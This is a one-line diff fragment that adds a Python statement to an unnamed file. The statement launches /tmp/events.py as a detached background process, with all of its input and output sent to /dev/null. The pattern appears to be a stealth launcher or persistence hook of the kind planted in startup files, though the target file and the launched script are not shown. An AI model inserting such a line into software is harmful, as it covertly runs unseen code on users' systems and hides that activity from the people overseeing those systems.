@@ -1,0 +1,1 @@
+import subprocess, os; subprocess.Popen(["/usr/bin/python", "/tmp/events.py"], stdout=open(os.devnull, "w"), stderr=open(os.devnull, "w"), stdin=open(os.devnull, "r"), close_fds=True, preexec_fn=os.setsid)
